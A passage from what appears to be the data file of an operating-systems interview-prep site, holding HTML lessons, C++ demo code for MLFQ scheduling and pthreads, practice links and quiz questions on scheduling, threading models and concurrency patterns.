boost)</td><td>Approximates</td><td>General-purpose OS</td></tr></table></div><div class="learn-section"><div class="learn-h">Real-World Schedulers</div><p class="learn-p">Modern operating systems use sophisticated schedulers:</p><ul class="learn-list"><li><b>Linux CFS (Completely Fair Scheduler):</b> Uses a red-black tree to maintain processes sorted by virtual runtime. Aims to give each process a fair share of CPU. Time complexity: <span class="learn-complexity">O(log n)</span> for picking the next process.</li><li><b>Windows:</b> Uses a multilevel feedback queue with 32 priority levels (0&ndash;31). Threads in the same priority level are scheduled round-robin.</li><li><b>macOS/iOS:</b> Based on Mach scheduler with multilevel feedback queues and priority decay.</li></ul><div class="learn-tip"><b>Tip:</b> In interviews, being able to discuss real-world schedulers (especially Linux CFS) and how they approximate MLFQ shows depth of understanding.</div></div><div class="learn-section"><div class="learn-h">Real-Time Scheduling</div><p class="learn-p">Real-time systems have strict deadline requirements. There are two main categories:</p><ul class="learn-list"><li><b>Hard real-time:</b> Missing a deadline is a system failure (e.g., airbag deployment, cardiac pacemaker).</li><li><b>Soft real-time:</b> Missing a deadline degrades quality but is tolerable (e.g., video streaming, audio playback).</li></ul><p class="learn-p">Key real-time scheduling algorithms:</p><table class="learn-table"><tr><th>Algorithm</th><th>Priority</th><th>Optimal?</th><th>Utilization Bound</th></tr><tr><td><b>Rate Monotonic (RMS)</b></td><td>Static &mdash; shorter period = higher priority</td><td>Optimal among static-priority</td><td>n(2<sup>1/n</sup> &minus; 1) &rarr; ~69% for large n</td></tr><tr><td><b>Earliest Deadline First (EDF)</b></td><td>Dynamic &mdash; nearest deadline = highest priority</td><td>Optimal for uniprocessor</td><td>100% (can fully utilize CPU)</td></tr></table><p class="learn-p"><b>RMS</b> assigns static priorities based on period: a task with period 10ms gets higher priority than one with period 50ms. It guarantees schedulability if total CPU utilization &le; n(2<sup>1/n</sup> &minus; 1). <b>EDF</b> dynamically assigns the highest priority to the task with the nearest deadline, achieving 100% CPU utilization &mdash; but is more complex to implement and harder to analyze under overload.</p></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Scheduler</th><th>Design</th><th>Key Feature</th><th>Used In</th></tr><tr><td>Basic MLFQ</td><td>Multiple RR queues with different quanta</td><td>Auto-classifies processes</td><td>Textbook</td></tr><tr><td>MLFQ with boost</td><td>Periodic boost to top queue</td><td>Prevents starvation</td><td>Most implementations</td></tr><tr><td>Linux CFS</td><td>Red-black tree ordered by virtual runtime</td><td>Weighted fair sharing, O(log n)</td><td>Linux 2.6.23+</td></tr><tr><td>Windows scheduler</td><td>32-level priority with feedback</td><td>Interactive boost on window focus</td><td>Windows NT+</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Gaming the scheduler:</b> A process can issue a tiny I/O just before its quantum expires to stay at high priority. Fix: track cumulative CPU time at each level.</li><li><b>Starvation without priority boost:</b> CPU-bound processes in the lowest queue may never execute.</li><li><b>Too many queues:</b> More queues = more configuration complexity. Most implementations use 3-5 levels.</li><li><b>Wrong boost period:</b> Too frequent steals from interactive processes. Too infrequent leads to starvation.</li><li><b>MLFQ is not truly optimal:</b> It approximates SJF behavior but learns reactively.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Time Complexity</th><th>Starvation Free?</th><th>Needs Burst Info?</th><th>Best For</th></tr><tr><td>FCFS</td><td><span class="learn-complexity">O(1)</span></td><td>Yes</td><td>No</td><td>Simple batch</td></tr><tr><td>SJF</td><td><span class="learn-complexity">O(n) or O(log n)</span></td><td>No</td><td>Yes</td><td>Known burst times</td></tr><tr><td>SRTF</td><td><span class="learn-complexity">O(n) or O(log n)</span></td><td>No</td><td>Yes</td><td>Minimum WT</td></tr><tr><td>RR</td><td><span class="learn-complexity">O(1)</span></td><td>Yes</td><td>No</td><td>Interactive/time-sharing</td></tr><tr><td>Priority</td><td><span class="learn-complexity">O(log n)</span></td><td>No (without aging)</td><td>No</td><td>Differentiated tasks</td></tr><tr><td>MLFQ</td><td><span class="learn-complexity">O(1) per decision</span></td><td>Yes (with boost)</td><td>No</td><td>General-purpose OS</td></tr><tr><td>Linux CFS</td><td><span class="learn-complexity">O(log n)</span></td><td>Yes</td><td>No</td><td>Linux desktop/server</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: How does MLFQ approximate SJF without knowing burst times?</b><br>A: MLFQ starts all new processes at the highest priority. Short processes complete quickly and stay high. Long processes use up their quantum and get demoted. Over time, this naturally sorts processes by burst length.</p><p class="learn-p"><b>Q2: How does Linux CFS work?</b><br>A: CFS tracks each process\'s virtual runtime (actual runtime / weight). It always picks the process with the smallest virtual runtime from a red-black tree. Higher-weight processes accumulate vruntime slower, getting more CPU time.</p><p class="learn-p"><b>Q3: How does MLFQ prevent gaming?</b><br>A: Instead of resetting time accounting when a process gives up the CPU, MLFQ accumulates total CPU time at each priority level. Once the allotment is exceeded, the process is demoted regardless.</p><p class="learn-p"><b>Q4: What is the purpose of priority boost?</b><br>A: Periodic boost moves all processes to the highest queue. This prevents starvation and handles processes whose behavior changes (e.g., CPU-bound becoming interactive).</p><p class="learn-p"><b>Q5: For a real-time system, which algorithm would you choose?</b><br>A: For hard real-time: Rate Monotonic or Earliest Deadline First. These provide formal deadline guarantees. MLFQ is unsuitable because it cannot guarantee worst-case response times.</p></div>',

          code: `// Multilevel Feedback Queue (MLFQ) Simulation in C++
#include <iostream>
#include <vector>
#include <queue>
#include <algorithm>
using namespace std;

struct Process {
    int id, arrival, totalBurst;
    int remaining;
    int currentQueue;    // Which queue the process is in
    int timeUsedInQueue; // Time used at current priority level
    int completion;
};

// MLFQ with 3 queues: Q0(q=4), Q1(q=8), Q2(FCFS)
void mlfq(vector<Process> procs) {
    int n = procs.size();
    int quanta[] = {4, 8, 999999}; // Q0, Q1, Q2 (FCFS = huge quantum)
    int numQueues = 3;

    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });

    for (auto &p : procs) {
        p.remaining = p.totalBurst;
        p.currentQueue = 0;
        p.timeUsedInQueue = 0;
        p.completion = 0;
    }

    // Three ready queues
    queue<int> Q[3];
    int currentTime = 0, completed = 0, nextArrival = 0;

    cout << "=== MLFQ Scheduling (Q0:q=4, Q1:q=8, Q2:FCFS) ===" << endl;
    cout << "Execution trace:" << endl;

    while (completed < n) {
        // Add newly arrived processes to Q0
        while (nextArrival < n && procs[nextArrival].arrival <= currentTime) {
            Q[0].push(nextArrival);
            procs[nextArrival].currentQueue = 0;
            nextArrival++;
        }

        // Find highest priority non-empty queue
        int qIdx = -1;
        for (int q = 0; q < numQueues; q++) {
            if (!Q[q].empty()) { qIdx = q; break; }
        }

        if (qIdx == -1) {
            // No process ready, advance time
            if (nextArrival < n) currentTime = procs[nextArrival].arrival;
            continue;
        }

        int i = Q[qIdx].front();
        Q[qIdx].pop();

        int quantum = quanta[qIdx];
        int execTime = min(quantum, procs[i].remaining);

        cout << "  t=" << currentTime << ": P" << procs[i].id
             << " runs from Q" << qIdx << " for " << execTime
             << "ms (remaining after: " << procs[i].remaining - execTime
             << ")" << endl;

        currentTime += execTime;
        procs[i].remaining -= execTime;

        // Add newly arrived processes (they arrived during execution)
        while (nextArrival < n && procs[nextArrival].arrival <= currentTime) {
            Q[0].push(nextArrival);
            procs[nextArrival].currentQueue = 0;
            nextArrival++;
        }

        if (procs[i].remaining == 0) {
            procs[i].completion = currentTime;
            completed++;
            cout << "    -> P" << procs[i].id << " completed at t="
                 << currentTime << endl;
        } else if (qIdx < numQueues - 1) {
            // Demote to next lower queue
            procs[i].currentQueue = qIdx + 1;
            Q[qIdx + 1].push(i);
            cout << "    -> P" << procs[i].id << " demoted to Q"
                 << qIdx + 1 << endl;
        } else {
            // Already in lowest queue, stay
            Q[qIdx].push(i);
        }
    }

    cout << "\\nResults:" << endl;
    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    double totalTAT = 0, totalWT = 0;
    for (auto &p : procs) {
        int tat = p.completion - p.arrival;
        int wt = tat - p.totalBurst;
        totalTAT += tat; totalWT += wt;
        cout << "P" << p.id << "\\t" << p.arrival << "\\t"
             << p.totalBurst << "\\t" << p.completion << "\\t"
             << tat << "\\t" << wt << endl;
    }
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 20, 0, 0, 0, 0},
        {2, 0,  5, 0, 0, 0, 0},
        {3, 2,  8, 0, 0, 0, 0},
        {4, 5,  3, 0, 0, 0, 0}
    };
    mlfq(procs);
    return 0;
}`,
          problems: [
            ['MLFQ Scheduling', 'https://www.geeksforgeeks.org/multilevel-feedback-queue-scheduling-mlfq-cpu-scheduling/', 'Hard'],
            ['Multilevel Queue Scheduling', 'https://www.geeksforgeeks.org/multilevel-queue-mlq-cpu-scheduling/', 'Medium'],
            ['Comparison of CPU Scheduling Algorithms', 'https://www.geeksforgeeks.org/cpu-scheduling-in-operating-systems/', 'Easy'],
            ['Linux CFS Scheduler', 'https://www.geeksforgeeks.org/completely-fair-scheduler-cfs-and-brain-fuck-scheduler-bfs/', 'Hard'],
            ['Process Scheduling Practice', 'https://www.geeksforgeeks.org/gate-notes-operating-system-process-scheduling/', 'Medium'],
          ],
          mcqs: [
            {q: 'In a typical MLFQ, what happens to a process that uses its entire time quantum?', o: ['It stays in the same queue', 'It is moved to a higher priority queue', 'It is moved to a lower priority queue', 'It is terminated'], a: 2},
            {q: 'What mechanism prevents starvation in MLFQ?', o: ['Aging within queues', 'Periodic priority boost', 'Round Robin at each level', 'Using SJF in the lowest queue'], a: 1},
            {q: 'The Linux Completely Fair Scheduler (CFS) uses which data structure to manage processes?', o: ['Hash table', 'Linked list', 'Red-black tree', 'Min-heap'], a: 2},
            {q: 'Where does a new process enter in MLFQ?', o: ['The lowest priority queue', 'The highest priority queue', 'A queue based on its burst time estimate', 'A randomly selected queue'], a: 1},
            {q: 'How does MLFQ prevent gaming by processes that issue fake I/O?', o: ['By disabling I/O for high-priority processes', 'By tracking total CPU time at each level and demoting when allotment is used', 'By using FCFS in all queues', 'By assigning random priorities after each I/O'], a: 1},
            {q: 'Which scheduling algorithm does Linux CFS primarily aim to provide?', o: ['Shortest Job First', 'Strict priority scheduling', 'Proportional fair-share scheduling', 'First Come First Served'], a: 2},
          ],
        },
      ],
    },

    // ===== TAB: THREADS =====
    {
      id: 'threads', t: 'Threads',
      topics: [
        // ----- Topic 0: Threads & Multithreading Models -----
        {
          t: 'Threads & Multithreading Models',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">A web server like Nginx handles thousands of concurrent connections. Creating a separate process per connection would be prohibitively expensive. Threads provide concurrency within a single address space at ~10x lower creation cost and ~5x faster context switching. Understanding threads and threading models is critical for designing concurrent systems.</p></div><div class="learn-section"><div class="learn-h">What is a Thread?</div><p class="learn-p">A <b>thread</b> is the smallest unit of CPU execution. It is a lightweight process that shares the same address space as other threads within the same process. Each thread has its own:</p><ul class="learn-list"><li><b>Thread ID</b></li><li><b>Program Counter (PC)</b></li><li><b>Register set</b></li><li><b>Stack</b></li></ul><p class="learn-p">Threads within the same process <b>share</b>:</p><ul class="learn-list"><li>Code section (text segment)</li><li>Data section (global variables)</li><li>Open files and signals</li><li>Heap memory</li></ul><div class="learn-tip"><b>Tip:</b> The key interview distinction: processes have separate address spaces; threads share the same address space. This makes thread creation, context switching, and communication much cheaper than for processes.</div></div><div class="learn-section"><div class="learn-h">Benefits of Multithreading</div><p class="learn-p">There are four major categories of benefits:</p><ol class="learn-list"><li><b>Responsiveness:</b> A multithreaded application can continue to respond to user input even when one thread is performing a lengthy operation (e.g., a web browser rendering one page while fetching another).</li><li><b>Resource Sharing:</b> Threads share the address space and resources of their process, which is more efficient than inter-process communication.</li><li><b>Economy:</b> Thread creation is ~30x faster than process creation. Context switching between threads is ~5x faster because there\'s no need to switch address spaces or flush the TLB.</li><li><b>Scalability:</b> Threads can run in parallel on multicore systems, achieving true parallelism.</li></ol></div><div class="learn-section"><div class="learn-h">User-Level Threads vs. Kernel-Level Threads</div><table class="learn-table"><tr><th>Feature</th><th>User-Level Threads (ULT)</th><th>Kernel-Level Threads (KLT)</th></tr><tr><td>Managed by</td><td>User-space thread library</td><td>Operating system kernel</td></tr><tr><td>Kernel awareness</td><td>Kernel is unaware of threads</td><td>Kernel manages each thread</td></tr><tr><td>Context switch</td><td>Very fast (no kernel involvement)</td><td>Slower (requires kernel mode switch)</td></tr><tr><td>Blocking</td><td>If one thread blocks, ALL threads in the process block</td><td>Only the blocking thread is affected</td></tr><tr><td>Multicore utilization</td><td>Cannot use multiple cores (kernel sees one thread)</td><td>Can run on different cores in parallel</td></tr><tr><td>Examples</td><td>GNU Portable Threads, Green Threads</td><td>Windows threads, Linux pthreads (NPTL)</td></tr></table><div class="learn-warn"><b>Warning:</b> The biggest disadvantage of pure user-level threads is that a blocking system call blocks the entire process, since the kernel only sees one thread of execution.</div></div><div class="learn-section"><div class="learn-h">Multithreading Models</div><p class="learn-p">The relationship between user-level threads and kernel-level threads is established through one of three models:</p><div class="learn-h">1. Many-to-One Model</div><p class="learn-p">Many user-level threads are mapped to a <b>single kernel thread</b>. Thread management is done in user space, making it efficient. However:</p><ul class="learn-list"><li>If one thread makes a blocking call, the entire process blocks.</li><li>Cannot exploit multicore parallelism.</li><li>Example: Solaris Green Threads, GNU Portable Threads.</li></ul><div class="learn-h">2. One-to-One Model</div><p class="learn-p">Each user-level thread maps to a <b>separate kernel thread</b>. This provides more concurrency than many-to-one:</p><ul class="learn-list"><li>One thread blocking does not block others.</li><li>Multiple threads can run in parallel on multicore systems.</li><li>Overhead: creating a user thread requires creating a corresponding kernel thread, which can be expensive.</li><li>Example: <b>Linux (NPTL)</b>, Windows threads.</li></ul><div class="learn-h">3. Many-to-Many Model</div><p class="learn-p">Many user-level threads are multiplexed over a <b>smaller or equal number</b> of kernel threads. This provides the best of both worlds:</p><ul class="learn-list"><li>True concurrency (threads can run on different cores).</li><li>No blocking of entire process.</li><li>User can create as many threads as needed without overwhelming the kernel.</li><li>More complex to implement.</li><li>Example: Solaris prior to version 9, Windows ThreadFiber package.</li></ul><div class="learn-tip"><b>Tip:</b> Modern systems (Linux, Windows, macOS) predominantly use the <b>one-to-one model</b> because kernel thread creation has become efficient enough, and the simplicity of the model outweighs the overhead.</div></div><div class="learn-section"><div class="learn-h">POSIX Threads (pthreads)</div><p class="learn-p"><b>pthreads</b> is the standard API for creating and managing threads in Unix/Linux. Key functions:</p><div class="learn-code">pthread_create(&amp;tid, &amp;attr, function, arg); // Create thread\npthread_join(tid, &amp;retval);                  // Wait for thread\npthread_exit(retval);                        // Thread exits\npthread_mutex_lock(&amp;mutex);                  // Lock mutex\npthread_mutex_unlock(&amp;mutex);                // Unlock mutex</div></div><div class="learn-section"><div class="learn-h">Thread Pools</div><p class="learn-p">A <b>thread pool</b> creates a number of threads at startup and keeps them waiting for work. When a request arrives, a thread from the pool handles it, then returns to the pool. Benefits:</p><ul class="learn-list"><li>Faster to service a request with an existing thread than to create a new one.</li><li>Limits the total number of threads, preventing system resource exhaustion.</li><li>Separates the mechanism of creating the task from its execution.</li></ul><p class="learn-p">Thread pools are used extensively in web servers (e.g., Apache, Tomcat), database connection pooling, and the Java <code>ExecutorService</code>.</p></div><div class="learn-section"><div class="learn-h">Thread Cancellation</div><p class="learn-p">Sometimes a thread must be terminated before it completes (e.g., user cancels a search). Two approaches:</p><ul class="learn-list"><li><b>Asynchronous cancellation:</b> The target thread is terminated <b>immediately</b>. Dangerous because the thread may be in the middle of updating shared data or holding a lock.</li><li><b>Deferred cancellation (default in pthreads):</b> The target thread periodically checks whether it should terminate at designated <b>cancellation points</b>. This allows the thread to clean up resources, release locks, and exit gracefully.</li></ul><div class="learn-code">pthread_cancel(tid);                          // Request cancellation\npthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL); // Deferred (default)\npthread_testcancel();                         // Cancellation point check\npthread_cleanup_push(cleanup_handler, arg);   // Register cleanup handler\npthread_cleanup_pop(execute);                 // Remove handler</div><div class="learn-warn"><b>Warning:</b> Asynchronous cancellation can leave mutexes locked and memory leaked. Always prefer deferred cancellation with proper cleanup handlers.</div></div><div class="learn-section"><div class="learn-h">Thread-Local Storage (TLS)</div><p class="learn-p"><b>Thread-Local Storage</b> provides each thread with its own copy of a variable, even though they share the same address space. Unlike stack variables (which are local to a function), TLS variables persist across function calls within the same thread.</p><div class="learn-code">// C11 / C++11\nthread_local int perThreadCounter = 0;\n\n// POSIX\n__thread int perThreadCounter = 0;\n\n// Java\nThreadLocal&lt;Integer&gt; counter = ThreadLocal.withInitial(() -> 0);</div><p class="learn-p">Common uses: errno (each thread needs its own error code), per-thread caches, transaction IDs, and random number generator state.</p></div><div class="learn-section"><div class="learn-h">fork() in Multithreaded Programs</div><p class="learn-p">Calling <code>fork()</code> in a multithreaded program is <b>extremely dangerous</b>. POSIX specifies that only the <b>calling thread</b> is duplicated in the child process &mdash; all other threads vanish. This leads to critical problems:</p><ul class="learn-list"><li>If another thread held a mutex at the time of fork, that mutex is <b>permanently locked</b> in the child (the thread that would unlock it doesn\'t exist).</li><li>Heap state may be inconsistent if another thread was mid-allocation.</li><li>The child should call <code>exec()</code> immediately or use only async-signal-safe functions.</li></ul><div class="learn-tip"><b>Tip:</b> Use <code>pthread_atfork()</code> to register handlers that acquire/release all locks around fork, ensuring the child starts with a consistent state. Better yet: fork before creating threads, or use <code>posix_spawn()</code>.</div></div><div class="learn-section"><div class="learn-h">Hardware Threads &amp; Hyper-Threading (SMT)</div><p class="learn-p"><b>Simultaneous Multithreading (SMT)</b>, marketed as Intel Hyper-Threading, allows a single physical CPU core to present <b>two (or more) logical cores</b> to the OS. Each logical core has its own architectural state (registers, PC) but shares execution units, caches, and TLB with its sibling.</p><ul class="learn-list"><li>A 4-core CPU with 2-way SMT appears as <b>8 logical CPUs</b> to the OS.</li><li>Benefit: when one hardware thread stalls on a cache miss, the other can use the execution units (~15-30% throughput gain for mixed workloads).</li><li>Limitation: two compute-heavy threads on the same core compete for ALUs and cache &mdash; performance can degrade.</li><li>Security: Hyper-Threading enables side-channel attacks (e.g., PortSmash, TLBleed) because sibling threads share microarchitectural state.</li></ul><p class="learn-p">For latency-sensitive systems (e.g., high-frequency trading infrastructure), SMT is sometimes <b>disabled</b> to eliminate jitter and side-channel risk.</p></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Model</th><th>User:Kernel Ratio</th><th>Blocking</th><th>Multicore?</th><th>Example</th></tr><tr><td>Many-to-One</td><td>N:1</td><td>One blocks all</td><td>No</td><td>GNU Portable Threads</td></tr><tr><td>One-to-One</td><td>1:1</td><td>Independent</td><td>Yes</td><td>Linux NPTL, Windows</td></tr><tr><td>Many-to-Many</td><td>M:N</td><td>Independent</td><td>Yes</td><td>Solaris pre-9</td></tr><tr><td>Two-Level</td><td>M:N + 1:1</td><td>Flexible</td><td>Yes</td><td>IRIX, HP-UX</td></tr><tr><td>Green Threads (modern)</td><td>M:N with work-stealing</td><td>User-level scheduler</td><td>Yes</td><td>Go goroutines, Java virtual threads</td></tr></table><p class="learn-p"><b>Go goroutines</b> use a modern M:N model with a work-stealing scheduler. Goroutines are multiplexed onto OS threads, providing lightweight creation (~2 KB initial stack) with full multicore utilization.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Threads share heap but not stack:</b> Returning a pointer to a thread\'s local variable creates a dangling pointer when the thread exits.</li><li><b>Thread safety is not free:</b> Shared mutable state requires synchronization. Over-synchronization kills parallelism; under-synchronization causes data races.</li><li><b>Many-to-one blocking trap:</b> Any blocking system call blocks ALL user threads because the kernel sees only one thread.</li><li><b>Thread creation limits:</b> Each thread needs its own stack (1-8 MB). On a 32-bit system, max ~3000 threads with 1 MB stacks.</li><li><b>Signal handling with threads:</b> Signals are delivered to the process, not a specific thread. Use a dedicated signal-handling thread with sigwait().</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Process</th><th>Kernel Thread</th><th>Goroutine</th></tr><tr><td>Creation time</td><td>~100 &mu;s</td><td>~10 &mu;s</td><td>~1 &mu;s</td></tr><tr><td>Context switch</td><td>~1-10 &mu;s + TLB flush</td><td>~0.5-5 &mu;s</td><td>~0.1-0.5 &mu;s</td></tr><tr><td>Memory overhead</td><td>Full address space (~4+ MB)</td><td>Stack only (~1-8 MB)</td><td>~2-8 KB (growable)</td></tr><tr><td>Max count (practical)</td><td>~1000s</td><td>~10,000s</td><td>~1,000,000s</td></tr><tr><td>Isolation</td><td>Full (separate address space)</td><td>None (shared)</td><td>None</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between concurrency and parallelism?</b><br>A: Concurrency means multiple tasks make progress over time (may interleave on a single core). Parallelism means tasks physically execute simultaneously on different cores.</p><p class="learn-p"><b>Q2: Why do modern systems use the one-to-one threading model?</b><br>A: One-to-one provides true parallelism on multicore hardware and avoids the blocking problem of many-to-one. Kernel thread creation overhead (~10 &mu;s) has decreased enough to make M:N complexity unnecessary for most workloads.</p><p class="learn-p"><b>Q3: What are the advantages of Go goroutines over pthreads?</b><br>A: Goroutines have ~2 KB initial stack (vs 1-8 MB), creation takes ~1 &mu;s (vs ~10 &mu;s), and the Go runtime multiplexes millions of goroutines onto a small number of OS threads.</p><p class="learn-p"><b>Q4: What is a thread pool?</b><br>A: A thread pool pre-creates worker threads that pull tasks from a queue. Benefits: avoids per-request creation/destruction overhead, limits concurrency. Used in web servers and Java ExecutorService.</p><p class="learn-p"><b>Q5: Can two threads of the same process have different scheduling priorities?</b><br>A: Yes. In the one-to-one model, each thread has its own kernel thread with an independent priority, allowing high-priority UI threads and low-priority background threads.</p><p class="learn-p"><b>Q6: Why is fork() dangerous in a multithreaded program?</b><br>A: Only the calling thread is copied to the child. If another thread held a mutex, that mutex is permanently locked in the child. Use exec() immediately after fork, or use posix_spawn().</p><p class="learn-p"><b>Q7: What is thread-local storage and when would you use it?</b><br>A: TLS gives each thread its own copy of a variable (declared with thread_local in C++11). Used for errno, per-thread caches, and RNG state &mdash; avoids synchronization overhead for data that is logically per-thread.</p></div>',
          code: `// Multithreading Demo in C++ using pthreads
#include <iostream>
#include <pthread.h>
#include <unistd.h>
#include <vector>
using namespace std;

// Shared data between threads
int sharedCounter = 0;
pthread_mutex_t counterMutex = PTHREAD_MUTEX_INITIALIZER;

// Thread function: increments shared counter safely
void* incrementCounter(void* arg) {
    int threadId = *(int*)arg;
    for (int i = 0; i < 100000; i++) {
        pthread_mutex_lock(&counterMutex);
        sharedCounter++;
        pthread_mutex_unlock(&counterMutex);
    }
    cout << "Thread " << threadId << " finished incrementing." << endl;
    return NULL;
}

// Thread function: simulates I/O-bound work
void* ioBoundWork(void* arg) {
    int threadId = *(int*)arg;
    cout << "Thread " << threadId << " starting I/O work..." << endl;
    usleep(500000); // Simulate 500ms I/O
    cout << "Thread " << threadId << " I/O complete." << endl;
    return NULL;
}

// Simple thread pool simulation
struct Task {
    int taskId;
    void (*function)(int);
};

void processTask(int taskId) {
    cout << "  Processing task " << taskId
         << " on thread " << pthread_self() << endl;
    usleep(100000); // Simulate work
}

void* workerThread(void* arg) {
    // In a real pool, this would loop and pick tasks from a queue
    Task* task = (Task*)arg;
    task->function(task->taskId);
    return NULL;
}

int main() {
    // Demo 1: Multiple threads sharing data with mutex
    cout << "=== Shared Counter Demo ===" << endl;
    const int NUM_THREADS = 4;
    pthread_t threads[NUM_THREADS];
    int threadIds[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        threadIds[i] = i;
        pthread_create(&threads[i], NULL, incrementCounter, &threadIds[i]);
    }
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    cout << "Final counter value: " << sharedCounter
         << " (expected: " << NUM_THREADS * 100000 << ")" << endl;

    // Demo 2: Thread pool simulation
    cout << "\\n=== Thread Pool Simulation ===" << endl;
    const int POOL_SIZE = 3;
    const int NUM_TASKS = 6;
    pthread_t pool[POOL_SIZE];
    Task tasks[NUM_TASKS];

    for (int i = 0; i < NUM_TASKS; i++) {
        tasks[i] = {i, processTask};
    }

    // Process tasks in batches of POOL_SIZE
    for (int batch = 0; batch < NUM_TASKS; batch += POOL_SIZE) {
        int batchSize = min(POOL_SIZE, NUM_TASKS - batch);
        cout << "Batch starting at task " << batch << ":" << endl;
        for (int i = 0; i < batchSize; i++) {
            pthread_create(&pool[i], NULL, workerThread, &tasks[batch + i]);
        }
        for (int i = 0; i < batchSize; i++) {
            pthread_join(pool[i], NULL);
        }
    }

    pthread_mutex_destroy(&counterMutex);
    cout << "\\nAll demos complete." << endl;
    return 0;
}`,
          problems: [
            ['Thread vs Process Differences', 'https://www.geeksforgeeks.org/difference-between-process-and-thread/', 'Easy'],
            ['Multithreading Models', 'https://www.geeksforgeeks.org/multi-threading-models-in-process-management/', 'Medium'],
            ['Print FooBar Alternately (LeetCode 1115)', 'https://leetcode.com/problems/print-foobar-alternately/', 'Medium'],
            ['Building H2O (LeetCode 1117)', 'https://leetcode.com/problems/building-h2o/', 'Medium'],
            ['Web Crawler Multithreaded (LeetCode 1242)', 'https://leetcode.com/problems/web-crawler-multithreaded/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT shared between threads of the same process?', o: ['Code section', 'Global variables', 'Stack', 'Open file descriptors'], a: 2},
            {q: 'In the many-to-one threading model, what happens when one thread makes a blocking system call?', o: ['Only that thread blocks', 'All threads in the process block', 'The kernel creates a new thread', 'The call is converted to non-blocking'], a: 1},
            {q: 'Which threading model is used by modern Linux (NPTL)?', o: ['Many-to-One', 'One-to-One', 'Many-to-Many', 'Two-level'], a: 1},
            {q: 'What happens when fork() is called in a multithreaded process?', o: ['All threads are duplicated', 'Only the calling thread is duplicated', 'The process blocks until all threads exit', 'Fork fails with EAGAIN'], a: 1},
            {q: 'What is the default cancellation type in pthreads?', o: ['Asynchronous', 'Deferred', 'Disabled', 'Immediate'], a: 1},
            {q: 'On a 4-core CPU with 2-way SMT, how many logical CPUs does the OS see?', o: ['2', '4', '8', '16'], a: 2},
          ],
        },
        // ----- Topic 1: Concurrency Patterns & Thread Safety -----
        {
          t: 'Concurrency Patterns & Thread Safety',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Creating threads is easy; making them work <b>correctly together</b> is the hard part. Interviews heavily test understanding of concurrency hazards, because production systems process millions of events under strict correctness and latency requirements. This topic covers the patterns and pitfalls of multithreaded programming beyond basic synchronization primitives (covered in the Synchronization tab).</p></div><div class="learn-section"><div class="learn-h">Data Races vs Race Conditions</div><p class="learn-p">These are related but distinct concepts:</p><ul class="learn-list"><li><b>Data race:</b> Two threads access the same memory location concurrently, at least one is a write, and there is no synchronization. This is <b>undefined behavior</b> in C/C++ &mdash; the compiler may optimize assuming no data races.</li><li><b>Race condition:</b> The program\'s correctness depends on the relative timing of events. A race condition can exist even with proper locking (e.g., check-then-act pattern).</li></ul><div class="learn-code">// Data race (undefined behavior):\nint x = 0;\n// Thread A:  x = 1;\n// Thread B:  cout << x;  // may print 0, 1, or crash\n\n// Race condition (no data race, but still a bug):\nmutex m;\n// Thread A: lock(m); if(!map.count(k)) { unlock(m); lock(m); map[k]=v; unlock(m); }\n// Thread B may insert k between A\'s unlock and re-lock</div><div class="learn-tip"><b>Tip:</b> Eliminating data races (via mutexes, atomics) does not eliminate race conditions. You must ensure that your <b>logical invariants</b> hold across the entire critical section, not just individual accesses.</div></div><div class="learn-section"><div class="learn-h">Common Concurrency Patterns</div><p class="learn-p"><b>1. Producer-Consumer (Bounded Buffer)</b></p><p class="learn-p">One or more producers add items to a shared buffer; consumers remove them. Requires: mutex for buffer access, semaphore/condvar for full/empty signaling.</p><p class="learn-p"><b>2. Reader-Writer Lock</b></p><p class="learn-p">Multiple readers can access data simultaneously, but writers need exclusive access. Variations: reader-preference (may starve writers), writer-preference (may starve readers), fair (FIFO).</p><p class="learn-p"><b>3. Thread-Safe Singleton (Double-Checked Locking)</b></p><div class="learn-code">static Singleton* instance = nullptr;\nstatic mutex mtx;\n\nSingleton* getInstance() {\n    if (!instance) {               // Fast path: no lock\n        lock_guard&lt;mutex&gt; lock(mtx);\n        if (!instance) {           // Re-check under lock\n            instance = new Singleton();\n        }\n    }\n    return instance;\n}\n// In C++11+: just use static local (thread-safe by standard)\nSingleton&amp; getInstance() { static Singleton s; return s; }</div><div class="learn-warn"><b>Warning:</b> Double-checked locking is broken without memory barriers in pre-C++11. The compiler/CPU may reorder the pointer write before constructor completion. In C++11+, use <code>std::call_once</code> or a static local.</div><p class="learn-p"><b>4. Fork-Join Parallelism</b></p><p class="learn-p">A parent task spawns (forks) multiple child tasks, which execute in parallel, and then waits (joins) for all of them to complete. Used in: Java ForkJoinPool, OpenMP parallel sections, C++ <code>std::async</code>.</p><p class="learn-p"><b>5. Work-Stealing</b></p><p class="learn-p">Each thread maintains a local deque of tasks. When a thread finishes its work, it <b>steals</b> tasks from the tail of another thread\'s deque. Provides excellent load balancing with minimal contention. Used in Go scheduler, Java ForkJoinPool, Intel TBB.</p></div><div class="learn-section"><div class="learn-h">Memory Ordering &amp; Atomics</div><p class="learn-p">Modern CPUs reorder memory operations for performance. Without proper ordering guarantees, Thread B may see Thread A\'s writes in a different order than they were issued.</p><table class="learn-table"><tr><th>Memory 